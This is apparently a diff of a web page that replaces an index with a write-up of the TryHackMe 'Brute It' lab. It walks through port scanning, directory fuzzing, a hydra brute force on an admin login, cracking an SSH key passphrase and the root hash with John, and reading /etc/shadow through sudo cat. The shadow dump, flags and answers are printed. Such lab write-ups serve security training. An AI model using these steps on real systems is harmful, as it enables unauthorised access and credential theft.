@@ -23,7 +23,7 @@
     
     
       
-        <title>Summary write ups (easy difficulty) - Offense, Defense, and Everything Between</title>
+        <title>Brute It - Offense, Defense, and Everything Between</title>
       
     
     
@@ -71,6 +71,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#brute-it" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -102,7 +107,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Summary write ups (easy difficulty)
+              Brute It
             
           </span>
         </div>
@@ -607,6 +612,99 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Port Scanning
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Foothold
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -621,26 +719,274 @@
                 
                   
 
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:brute-force" class="md-tag">brute-force</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:challenge" class="md-tag">challenge</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:easy" class="md-tag">easy</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:linux" class="md-tag">linux</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:offensive" class="md-tag">offensive</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:password-cracking" class="md-tag">password-cracking</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:sudo-abuse" class="md-tag">sudo-abuse</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+  </nav>
 
 
-  <h1>Summary write ups (easy difficulty)</h1>
 
+<h1 id="brute-it">Brute It</h1>
+<p><img alt="Brute It logo" src="../logos/brute_it_logo.png" /></p>
+<p><strong>Platform:</strong> TryHackMe<br />
+<strong>Type:</strong> Challenge<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Link:</strong> <a href="https://tryhackme.com/room/bruteit">Brute It</a>  </p>
+<h2 id="description">Description</h2>
+<p>"Learn how to brute, hash cracking and escalate privileges in this box!"</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<div class="highlight"><pre><span></span><code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)
+nmap -p$ports -A -T4 TARGET_IP_ADDRESS
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>Host is up (0.066s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
+|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
+|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone
+Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X|9.X (93%)
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:google:android:9
+Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 - 5.15 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+<details class="success">
+<summary>How many ports are open?</summary>
+<p>2</p>
+</details>
+<details class="success">
+<summary>What version of SSH is running?</summary>
+<p>OpenSSH 7.6p1</p>
+</details>
+<details class="success">
+<summary>What version of Apache is running?</summary>
+<p>2.4.29</p>
+</details>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<div class="highlight"><pre><span></span><code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
+gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
+</code></pre></div>
+<p><strong>Notes</strong>  </p>
 <ul>
-<li><a href="../brooklyn_nine_nine/">Brooklyn Nine Nine</a>  </li>
-<li><a href="../smag_grotto/">Smag Grotto</a>  </li>
-<li><a href="../bounty_hunter/">Bounty Hunter</a>  </li>
-<li><a href="../easy_peasy/">Easy Peasy</a></li>
-<li><a href="../gamingserver/">GamingServer</a></li>
-<li><a href="../rootme/">RootMe</a></li>
-<li><a href="../poster/">Poster</a></li>
-<li><a href="../brute_it/">Brute It</a></li>
+<li>Default web server installation page in web browser (reveals OS of host)  </li>
+<li>No <code>robots.txt</code> or <code>sitemap</code> files  </li>
+<li>Nothing interesting in the source code  </li>
+<li><code>ffuf</code> scan reveals <code>/admin</code> directory: <code>POST</code> form serves a login form to an admin interface. Source code reveals user name is "admin"  </li>
 </ul>
+<details class="success">
+<summary>Which Linux distribution is running?</summary>
+<p>Ubuntu</p>
+</details>
+<details class="success">
+<summary>What is the hidden directory?</summary>
+<p>/admin</p>
+</details>
+<h3 id="vulnerability-enumeration">Vulnerability Enumeration</h3>
+<div class="highlight"><pre><span></span><code>searchsploit OpenSSH 7.6p1  # Only results: username enumeration
+searchsploit httpd 2.4.29   # Only result: DoS
+</code></pre></div>
+<h2 id="foothold">Foothold</h2>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Use BurpSuite to capture POST form field information for use with <code>hydra</code>  </p>
+<div class="highlight"><pre><span></span><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP_ADDRESS http-post-form &quot;/admin/:user=^USER^&amp;pass=^PASS^:Username or password invalid&quot;
+</code></pre></div>
+<details class="success">
+<summary>What is the user:password of the admin panel?</summary>
+<p>admin:xavier</p>
+</details>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Login to the admin panel with newly discovered credentials  </p>
+<p><strong>Notes</strong>  </p>
+<ul>
+<li>Web page reveals a flag  </li>
+<li>Web page holds a link to a private RSA key for the user "john"  </li>
+</ul>
+<details class="success">
+<summary>Web flag</summary>
+<p>THM{brut3_f0rce_is_e4sy}</p>
+</details>
+<p><strong>Actions</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Copy contents of private RSA key on admin panel to file on attacker machine  </p>
+<div class="highlight"><pre><span></span><code>ssh2john id_rsa &gt; key.hash
+john key.hash --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre></div>
+<details class="success">
+<summary>What is John's RSA Private Key passphrase?</summary>
+<p>rockinroll</p>
+</details>
+<div class="highlight"><pre><span></span><code>chmod 600 id_rsa
+ssh john@TARGET_IP_ADDRESS -i id_rsa
+
+john@bruteit:~$ ls -al
+total 40
+drwxr-xr-x 5 john john 4096 Sep 30  2020 .
+drwxr-xr-x 4 root root 4096 Aug 28  2020 ..
+-rw------- 1 john john  394 Sep 30  2020 .bash_history
+-rw-r--r-- 1 john john  220 Aug 16  2020 .bash_logout
+-rw-r--r-- 1 john john 3771 Aug 16  2020 .bashrc
+drwx------ 2 john john 4096 Aug 16  2020 .cache
+drwx------ 3 john john 4096 Aug 16  2020 .gnupg
+-rw-r--r-- 1 john john  807 Aug 16  2020 .profile
+drwx------ 2 john john 4096 Aug 16  2020 .ssh
+-rw-r--r-- 1 john john    0 Aug 16  2020 .sudo_as_admin_successful
+-rw-r--r-- 1 root root   33 Aug 16  2020 user.txt
+john@bruteit:~$ cat user.txt
+</code></pre></div>
+<details class="success">
+<summary>user.txt</summary>
+<p>THM{a_password_is_not_a_barrier}</p>
+</details>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<div class="highlight"><pre><span></span><code>john@bruteit:~$ sudo -l
+Matching Defaults entries for john on bruteit:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat
+john@bruteit:~$ sudo cat /etc/shadow
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+daemon:*:18295:0:99999:7:::
+bin:*:18295:0:99999:7:::
+sys:*:18295:0:99999:7:::
+sync:*:18295:0:99999:7:::
+games:*:18295:0:99999:7:::
+man:*:18295:0:99999:7:::
+lp:*:18295:0:99999:7:::
+mail:*:18295:0:99999:7:::
+news:*:18295:0:99999:7:::
+uucp:*:18295:0:99999:7:::
+proxy:*:18295:0:99999:7:::
+www-data:*:18295:0:99999:7:::
+backup:*:18295:0:99999:7:::
+list:*:18295:0:99999:7:::
+irc:*:18295:0:99999:7:::
+gnats:*:18295:0:99999:7:::
+nobody:*:18295:0:99999:7:::
+systemd-network:*:18295:0:99999:7:::
+systemd-resolve:*:18295:0:99999:7:::
+syslog:*:18295:0:99999:7:::
+messagebus:*:18295:0:99999:7:::
+_apt:*:18295:0:99999:7:::
+lxd:*:18295:0:99999:7:::
+uuidd:*:18295:0:99999:7:::
+dnsmasq:*:18295:0:99999:7:::
+landscape:*:18295:0:99999:7:::
+pollinate:*:18295:0:99999:7:::
+thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
+sshd:*:18489:0:99999:7:::
+john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
+</code></pre></div>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Copy contents of <code>root</code> entry in <code>/etc/shadow</code> and <code>/etc/passwd</code> files to attacker machine for use with <code>unshadow</code><br />
+<em><code>root</code> entry in <code>/etc/shadow</code> saved to "shadow"; <code>root</code> entry in <code>/etc/passwd</code> save to "passwd"</em></p>
+<div class="highlight"><pre><span></span><code>unshadow passwd shadow &gt; hash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre></div>
+<details class="success">
+<summary>What is the root's password?</summary>
+<p>football</p>
+</details>
+<div class="highlight"><pre><span></span><code>john@bruteit:~$ su root
+Password: 
+
+root@bruteit:/home/john# ls -al /root
+total 52
+drwx------  7 root root 4096 Sep 30  2020 .
+drwxr-xr-x 24 root root 4096 Sep 30  2020 ..
+-rw-------  1 root root  445 Sep 30  2020 .bash_history
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Sep  3  2020 .cache
+drwx------  3 root root 4096 Sep  3  2020 .gnupg
+drwx------  2 root root 4096 Aug 16  2020 .john
+drwxr-xr-x  3 root root 4096 Aug 15  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   26 Aug 17  2020 root.txt
+drwx------  2 root root 4096 Aug 15  2020 .ssh
+-rw-------  1 root root 2160 Sep 30  2020 .viminfo
+-rw-r--r--  1 root root  165 Aug 16  2020 .wget-hsts
+root@bruteit:/home/john# cat /root/root.txt
+</code></pre></div>
+<details class="success">
+<summary>root.txt</summary>
+<p>THM{pr1v1l3g3_3sc4l4t10n}</p>
+</details>
+<p><strong>Tools Used</strong><br />
+<code>Burp</code> <code>hydra</code> <code>ssh2john</code> <code>john</code> <code>unshadow</code></p>
+<p><strong>Date completed:</strong> 30/04/26<br />
+<strong>Date published:</strong> 30/04/26</p>
 
 
 
 
 
 
+
+  
+  
 
 
 
